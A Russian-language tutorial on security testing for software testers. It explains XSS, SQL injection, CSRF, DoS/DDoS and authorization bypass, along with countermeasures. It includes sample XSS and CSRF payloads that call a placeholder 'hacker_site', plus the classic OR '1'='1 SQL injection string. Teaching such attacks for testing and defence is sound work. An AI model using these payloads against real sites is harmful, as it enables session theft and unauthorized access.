**Тестирование безопасности** — оценка уязвимости программного обеспечения к
различным атакам.

Компьютерные системы очень часто являются мишенью незаконного проникновения. Под
проникновением понимается широкий диапазон действий: попытки хакеров проникнуть
в систему из спортивного интереса, месть рассерженных служащих, взлом
мошенниками для незаконной наживы. Тестирование безопасности проверяет
фактическую реакцию защитных механизмов, встроенных в систему, на проникновение.
В ходе тестирования безопасности испытатель играет роль взломщика.

Ему разрешено все:

•       попытки узнать пароль с помощью внешних средств;

•       атака системы с помощью специальных утилит, анализирующих защиты;

•       подавление, ошеломление системы (в надежде, что она откажется
обслуживать других клиентов);

•       целенаправленное введение ошибок в надежде проникнуть в систему в ходе
восстановления;

•       просмотр несекретных данных в надежде найти ключ для входа в систему.

•       при неограниченном времени и ресурсах хорошее тестирование безопасности
взломает любую систему.

Задача проектировщика системы — сделать цену проникновения более высокой, чем
цена получаемой в результате информации.

Общая стратегия безопасности основывается на трех основных принципах:

•       конфиденциальность

•       целостность

•       доступность

Особенности:

•       важность негативного тестирования

•       качество тестирования безопасности сложно измерить

•       думай как хакер

 

**XSS** (Сross Site Sсriрting)— тип уязвимости интерактивных информационных
систем в вебе. XSS возникает, когда в генерируемые сервером страницы по какой-то
причине попадают пользовательские скрипты. Специфика подобных атак заключается в
том, что вместо непосредственной атаки сервера они используют уязвимый сервер в
качестве средства атаки на клиента.

Сами по себе XSS атаки могут быть очень разнообразными. Злоумышленники могут
попытаться украсть ваши куки, перенаправить вас на сайт, где произойдет более
серьезная атака, загрузить в память какой-либо вредоносный объект и т.д., всего
навсего разместив вредоносный скрипт у вас на сайте. Как пример, можно
рассмотреть следующий скрипт, выводящий на экран ваши куки:

\<script\>alert(document.cookie);\</script\>

либо скрипт делающий редирект на зараженную страницу:

\<script\>window.parent.location.href='http://hacker\_site';\</script\>

либо создающий вредоносный объект с вирусом и т.п.:

\<object type="text/x-scriptlet" data="http://hacker\_site"\>\</object\>

 

**Code-injection** (SQL, PHP, ASP etc.) — это вид уязвимости, при котором
становится возможно осуществить запуск исполняемого кода с целью получения
доступа к системным ресурсам, несанкционированного доступа к данным либо
выведения системы из строя.

Вставки исполняемого кода рассмотрим на примере кода SQL.

Форма входа в систему имеет 2 поля - имя и пароль. Обработка происходит в базе
данных через выполнение SQL запроса:

SELECT Username

FROM Users

WHERE Name = 'tester'

AND Password = 'testpass';

Вводим корректное имя ’tester’, а в поле пароль вводим строку:

testpass' OR '1'='1

В итоге, Если поле не имеет соответствующих валидаций или обработчиков данных,
может вскрыться уязвимость, позволяющая зайти в защищенную паролем систему,
т.к.SQL запрос примет следующий вид:

SELECT Username

FROM Users

WHERE Name = 'tester'

AND Password = 'testpass' OR '1'='1';

Условие '1'='1' всегда будет истинным и поэтому SQL запрос всегда будет
возвращать много значений.

 

**XSRF / CSRF** (Request Forgery) - это вид уязвимости, позволяющий
использоваться недостатки HTTP протокола, при этом злоумышленники работают по
следующей схеме: ссылка на вредоносный сайт установливается на странице,
пользующейся доверием у пользователя, при переходе по вредоносной ссылке
выполняется скрипт, сохраняющий личные данные пользователя (пароли, платежные
данные и т.д.), либо отправляющий СПАМ сообщения от лица пользователя, либо
изменяет доступ к учетной записи пользователя, для получения полного контроля
над ней. Пример:

IMG SRC:

\<img src="http://hacker\_site/?command"\>

SCRIPT SRC:

\<script src="http://hacker\_site/?command"\>

Javascript объект Image:

\<script\>

           var foo = new Image();

           foo.src = "http://hacker\_site/?command";

\</script\>

 

**DoS-attack** (Denial of Service) — атака на вычислительную систему с целью
довести её до отказа, то есть создание таких условий, при которых легитимные
(правомерные) пользователи системы не могут получить доступ к предоставляемым
системой ресурсам (серверам), либо этот доступ затруднён. Отказ «вражеской»
системы может быть и шагом к овладению системой (если во внештатной ситуации ПО
выдаёт какую-либо критическую информацию — например, версию, часть программного
кода и т. д.). Но чаще это мера экономического давления: простои службы,
приносящей доход, счета от провайдера и меры по уходу от атаки ощутимо бьют
«цель» по карману.

Если атака выполняется одновременно с большого числа компьютеров, говорят
о **DDoS-атаке** (Distributed Denial of Service). В некоторых случаях к
фактической DDoS-атаке приводит непреднамеренное действие, например, размещение
на популярном интернет-ресурсе ссылки на сайт, размещённый на не очень
производительном сервере. Большой наплыв пользователей приводит к превышению
допустимой нагрузки на сервер и, следовательно, отказу в обслуживании части из
них.

Существуют различные причины, из-за которых может возникнуть DoS-условие:

**Ошибка** в программном коде, приводящая к обращению к неиспользуемому
фрагменту адресного пространства, выполнению недопустимой инструкции или другой
необрабатываемой исключительной ситуации, когда происходит аварийное завершение
программы-сервера — серверной программы. Классическим примером является
обращение по нулевому (*null*) адресу.

**Недостаточная проверка данных пользователя**, приводящая к бесконечному либо
длительному циклу или повышенному длительному потреблению процессорных ресурсов
(вплоть до исчерпания процессорных ресурсов) либо выделению большого объёма
оперативной памяти (вплоть до исчерпания доступной памяти).

**Flood**— атака, связанная с большим количеством обычно бессмысленных или
сформированных в неправильном формате запросов к компьютерной системе или
сетевому оборудованию, имеющая своей целью или приведшая к отказу в работе
системы из-за исчерпания системных ресурсов — процессора, памяти или каналов
связи.

**Атака второго рода** — атака, которая стремится вызвать ложное
срабатывание системы защиты и таким образом привести к недоступности ресурса.

Если атака (обычно флуд) производится одновременно с большого
количества IP-адресов — с нескольких рассредоточенных в сети компьютеров — то в
этом случае она называется распределённой атакой на отказ в обслуживании (DDoS).

Меры противодействия DoS-атакам можно разделить на пассивные и активные, а также
на превентивные и реакционные.

Ниже приведён краткий перечень основных методов.

**Предотвращение.** Профилактика причин, побуждающих тех или иных лиц
организовывать и предпринять DoS-атаки. (Очень часто кибератаки вообще являются
следствиями личных обид, политических, религиозных и иных разногласий,
провоцирующего поведения жертвы и т. п.)

**Фильтрация и блэкхолинг.** Блокирование трафика, исходящего от атакующих
машин. Эффективность этих методов снижается по мере приближения к объекту атаки
и повышается по мере приближения к атакующей машине.

**Устранение уязвимостей.** Не работает против флуд-атак, для которых
«уязвимостью» является конечность тех или иных системных ресурсов.

**Наращивание ресурсов.** Абсолютной защиты естественно не дает, но является
хорошим фоном для применения других видов защиты от DoS-атак.

**Рассредоточение.** Построение распределённых и дублирование систем, которые не
прекратят обслуживать пользователей, даже если некоторые их элементы станут
недоступны из-за DoS-атаки.

**Уклонение.** Увод непосредственной цели атаки (доменного имени или IP-адреса)
подальше от других ресурсов, которые часто также подвергаются воздействию вместе
с непосредственной целью атаки.

**Активные ответные меры.** Воздействие на источники, организатора или центр
управления атакой, как техногенными, так и организационно-правовыми средствами.

**Использование оборудования для отражения DoS-атак.** Например DefensePro®
(Radware), Arbor Peakflow® и от других производителей.

**Приобретение сервиса по защите от DoS-атак.** Актуально в случае превышения
флудом пропускной способности сетевого канала.

 

**Authorization Bypass**

Пользователь А может получить доступ к документам пользователя Б. Допустим, есть
реализация, где при просмотре своего профиля, содержащего конфеденциальную
информацию, в URL страницы передается userID, а данном случае есть смысл
попробовать подставить вместо своего userID номер другого пользователя. И если
вы увидите его данные, значит вы нашли дефект

 

Примеров уязвимостей и атак существует огромное количество. Даже проведя полный
цикл тестирования безопасности, нельзя быть на 100% уверенным, что система
по-настоящему обезопасена. Но можно быть уверенным в том, что процент
несанкционированных проникновений, краж информации и потерь данных будет в разы
меньше, чем у тех кто не проводил тестирования безопасности.
